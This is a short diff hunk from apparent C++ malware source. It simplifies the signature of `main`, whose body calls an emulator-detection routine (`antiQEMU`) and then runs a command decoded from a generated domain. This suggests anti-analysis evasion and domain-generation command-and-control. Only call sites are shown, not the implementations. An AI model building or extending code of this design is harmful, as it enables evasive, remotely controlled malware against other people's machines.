@@ -81,7 +81,7 @@ static int cmdHandler(std::wstring cmd)
 	return 0;
 }
 
-int main(int argc, char ∗argv[])
+int main()
 {
 	antiQEMU();
 	cmdHandler(decodeCmd(genDomain()));
